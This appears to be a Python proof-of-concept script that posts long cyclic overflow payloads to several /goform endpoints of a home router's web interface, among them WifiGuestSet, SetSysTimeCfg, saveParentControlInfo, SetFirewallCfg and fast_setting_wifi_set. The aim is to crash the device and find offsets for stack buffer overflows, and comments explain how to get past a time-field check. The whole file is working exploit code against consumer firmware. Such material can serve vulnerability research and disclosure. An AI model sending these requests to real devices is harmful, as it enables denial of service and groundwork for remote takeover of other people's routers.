import requests
    
host = "192.168.0.1"
cyclic = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaau"    
    
def exploit_WifiGuestSet():
    url = f"http://{host}/goform/WifiGuestSet"
    data = {
        # b"shareSpeed":b'A'*0x800
        b'shareSpeed':cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)
    
def exploit_sub_4a75c0():    
    url = f"http://{host}/goform/SetSysTimeCfg"
    payload = b''
    payload = payload.ljust(0x100,b'A') + b":" + cyclic
    data = {
        b"timeZone":payload
    }
    res = requests.post(url=url,data=data)
    print(res.content)    

def exploit_sub_4a79ec():    
    url = f"http://{host}/goform/SetSysTimeCfg"
    payload = b''
    # payload = payload.ljust(0x100,b'A') + b":" + b"A"*0x400
    data = {
        b"timeType":b"manual",
        b"time":cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

def exploit_saveParentControlInfo():
    url = f"http://{host}/goform/saveParentControlInfo"
    # Use the var44:deviceId
    #Due to v0 = compare_parentcontrol_time(p0); TIME MUST NOT BE NULL
    data = {
        b"time":b"0",
        b"deviceId":cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

def exploit_get_parentControl_list_Info():
    # To be clear, the difference between saveParentControlInfo and get_parentControl_list_Info 
    # is that we don't cause crash in saveParentControlInfo, but we do it in get_parentControl_list_Info 
    # by exploiting the var3c:time parameter, however, in saveParentControlInfo, we use var3c:time 
    # only to bypass the compare_parentcontrol_time(p0)
    
    url = f"http://{host}/goform/saveParentControlInfo"

    # Using the var3c:time
    data = {
        b"time":cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)
    
        
def exploit_formSetFirewallCfg():
    url = f"http://{host}/goform/SetFirewallCfg"
    data = {
        b"firewallEn":cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

def exploit_sub_44db3c():
    url = f"http://{host}/goform/fast_setting_wifi_set"
    payload = b''
    payload = payload.ljust(0x100,b'A') + b":" + cyclic
    data = {
        b"ssid":b'1',
        b"timeZone":payload
    }
    res = requests.post(url=url,data=data)
    print(res.content)
    

def pwn():
    pass

# exploit_get_parentControl_list_Info() 
exploit_sub_44db3c()